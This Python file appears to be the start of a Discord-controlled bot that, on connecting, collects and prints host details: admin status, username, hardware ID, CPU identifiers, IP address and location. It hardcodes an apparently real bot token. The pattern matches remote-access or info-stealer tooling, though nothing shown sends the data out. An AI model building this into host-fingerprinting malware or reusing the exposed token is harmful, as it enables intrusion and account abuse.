import discord
from discord.ext import commands
import ctypes

import util

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    print('--------------------------')
    print(f"Admin: {util.is_user_admin()}")
    print(f"Username: {util.get_user_name()}")
    print(f"HWID: {util.get_hwid()}")
    print(f"CPU Name: {util.get_cpu_name()}")
    print(f"CPU ID: {util.get_cpu_id()}")
    print(f"IPv4: {util.get_IPV4()}")
    print(f"Location: {util.get_location()}")
    print('--------------------------')

bot.run("MTQyMDE4MjcwNDkwOTA2MjI4Ng.GTEHIP.zlV71-r2CbMXmW_GL-sM1XdK_7oRMV2Jdx7c-g")